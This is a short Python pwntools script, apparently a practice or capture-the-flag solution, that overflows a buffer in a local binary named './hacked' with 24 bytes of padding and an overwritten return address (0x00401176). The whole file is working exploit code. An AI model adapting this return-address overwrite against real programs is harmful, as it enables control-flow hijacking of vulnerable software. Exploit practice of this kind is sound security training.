from pwn import *

r=process( './hacked' )


print(r.recvline())
payload= bytes("a" * 24,'utf-8')

address=0x00401176

payload += p64(address)
print(payload)
r.sendline(payload)
print(r.recvline())
print(r.recvline())



